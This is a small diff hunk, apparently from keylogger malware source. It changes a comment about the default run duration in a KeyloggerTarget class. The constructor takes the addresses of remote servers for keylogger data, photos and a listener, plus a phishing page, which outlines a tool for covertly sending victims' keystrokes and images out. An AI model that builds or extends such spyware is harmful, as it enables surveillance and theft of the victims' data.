@@ -19,7 +19,7 @@ class KeyloggerTarget:
     def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
                  port_of_server_keylogger_data, ip_of_server_listener, port_of_server_listener, ip_of_timer,
                  port_of_timer, duration_in_seconds=60, phishing_web=None):
-        # "duration_in_seconds" tells the programm how long it should last the default time is 200 seconds that's 3 Minutes and 20 Seconds
+        # "duration_in_seconds" tells the programm how long it should last the default time is 60 seconds that's 1 Minute
         assert duration_in_seconds >= 60, f"{duration_in_seconds} is not greater and not equal to 60"
         # "duration_in_seconds" should always be bigger than 60 seconds
 
